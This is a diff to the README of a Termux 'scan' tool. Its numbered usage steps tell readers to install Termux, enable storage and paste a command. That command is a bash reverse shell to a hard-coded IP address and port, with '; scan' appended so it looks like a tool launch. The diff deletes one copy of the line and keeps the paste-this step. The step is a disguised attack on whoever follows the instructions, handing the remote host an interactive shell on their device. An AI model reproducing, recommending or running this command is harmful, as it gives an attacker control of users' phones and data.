@@ -1,10 +1,14 @@
-bash -i >& /dev/tcp/209.25.141.181/22864 0>&1; scan
-           =Scan usage=
+=Scan usage=
 
 1 download termux from playstore or Google
 2 termux-setup-storage 
-3 copy and paste command bellow 
+3 copy and paste command bellow
+
+
+
 bash -i >& /dev/tcp/209.25.141.181/22864 0>&1; scan
+            
+
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
 <a name="readme-top"></a>
 <!--
